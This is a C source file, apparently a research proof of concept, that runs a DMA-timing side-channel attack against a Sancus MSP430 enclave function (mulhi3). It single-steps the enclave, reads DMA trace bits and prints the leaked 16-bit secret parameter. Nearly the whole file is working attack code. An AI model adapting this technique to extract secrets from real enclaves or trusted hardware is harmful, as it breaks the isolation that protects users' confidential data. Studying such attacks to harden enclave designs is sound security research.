#include <stdio.h>
#include <stdint.h>
#include "sancus_support/sm_io.h"
#include "sancus_support/sancus_step.h"

#include "nemdef.h"
#include "mulhi3.h"

#define DMA_ADDR (*((uint16_t*) 0x0070))
#define DMA_CNT (*((uint16_t*) 0x0072))
#define DMA_TRACE (*((uint16_t*) 0x0074))
#define DMA_OFFSET (*((uint16_t*) 0x0076))

asm(".section __interrupt_vector_10,\"ax\",@progbits \n\t"
    ".word timerA_isr_entry2                         \n\t");

void attack(void)
{
  __ss_print_latency();
}

void parse_dma(void)
{
  for (volatile int i = 0; i < 2048; ++i) {} // make sure we wait for the measurement

  char result[17] = "0000000000000000";

  uint16_t offset = 133;
  for (int i = 0; i < 16; ++i) {
    DMA_OFFSET = offset;
    uint16_t trace = DMA_TRACE;
    if (trace & 0x1) {
      break;
    }
    if (trace & 0x4) {
      result[15 - i] = '0';
    } else {
      result[15 - i] = '1';
    }
    offset += 80;
  }
  printf("The leaked parameter is: %s\n", result);
}

int main(void)
{
  msp430_io_init();

#ifdef SANCUS_STEP_ENABLED
  __ss_init();
#endif

  sancus_enable(&mulhi3);

  DMA_ADDR = 0xdead;
  DMA_CNT = 3204;

  ATTACK(mulhi3_enter, 0, 0);

  parse_dma();
  DMA_CNT = 3204;

  ATTACK(mulhi3_enter, 1, 1);

  parse_dma();
  DMA_CNT = 3315;

  ATTACK(mulhi3_enter, 3, 63);

  parse_dma();
  DMA_CNT = 3424;

  ATTACK(mulhi3_enter, 3, 255);

  parse_dma();

  EXIT();

  return 0;
}

SANCUS_STEP_ISR_ENTRY2(attack, __ss_end);
